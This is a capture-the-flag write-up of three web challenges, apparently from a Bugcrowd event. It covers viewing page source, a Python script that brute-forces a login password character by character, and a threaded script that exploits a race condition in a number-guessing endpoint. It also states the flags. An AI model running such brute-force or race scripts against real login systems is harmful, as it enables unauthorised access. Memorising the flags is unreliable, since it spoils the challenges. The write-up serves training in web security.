#### Easy Web
Find the flag hidden somewhere in the website
https://bugcrowd-easy-web.chals.io/

**TL;DR**
View-source to get the flag.

**Solve**
View the website and just view-source it.

![[Pasted image 20240422223302.png]]


flag{hidden_in_plain_sight}

#### What's The Time Mr. Wolf?
 

We've found this login page in our target infrastructure. We're running out of time! Can you please help us find a way in?
https://bugcrowd-whats-the-time-mr-wolf.chals.io/

**TL;DR**
Bruteforce the password for get the flag.

**Solve**
Get a website that has login form.
![[Pasted image 20240422223433.png]]


When i try to input something there a trigger Incorrect Password.
![[Pasted image 20240422223443.png]]


But there a letter that only trigger a blank page.

![[Pasted image 20240422223454.png]]

After that i create python script to iterate it.


```
import string
import itertools
import requests

characters = string.printable

for char in characters:
    url = "https://bugcrowd-whats-the-time-mr-wolf.chals.io/auth.php?pass=t" + char
    r = requests.get(url)
    print(url, r.content)
```


Get the output like this.
![[Pasted image 20240422223523.png]]


It's mean the next letter is e, after that we iterate every single letter to get the flag.

![[Pasted image 20240422223543.png]]

FLAG{hacking_takes_time_but_is_rewarding!}


#### Feeling Lucky?
Try and guess the magic number!
https://bugcrowd-feeling-lucky.chals.io

**TL;DR**
Race condition with guess number for get the flag.

**Solve**
Got a form for guess a correct number.

![[Pasted image 20240422224105.png]]

I try to input something different, and the debug mode was on.

![[Pasted image 20240422224112.png]]

Since the debug mode is on, we can see leak the source code on the website.


```
def guess():
global timer_started, timer_start_time, race_condition_window, race_condition_end_time
number = request.json.get(&#39;number&#39;)
current_time = datetime.now()
   if not number or not (1 &lt;= number &lt;= 100):
        return jsonify({&#34;error&#34;: &#34;Invalid number. Choose between 1-100.&#34;})
    with lock:
        if not timer_started:
            timer_started = True

```

After that i create script like this for guess the number.

```
import requests
import threading
requests.packages.urllib3.disable_warnings()

url = "https://bugcrowd-feeling-lucky.chals.io/guess"

def make_request(number):
    data = {"number": number}
    r = requests.post(url, json=data, verify=False)
    print(number, r.text)
    if "flag" in r.text:
        print("Flag found:", r.text)
        return True
    return False

def main():
    threads = []
    for i in range(0, 100):
        thread = threading.Thread(target=make_request, args=(i,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```
We run it until get the flag.
![[Pasted image 20240422224209.png]]


flag{pfft_lucky_guess!}

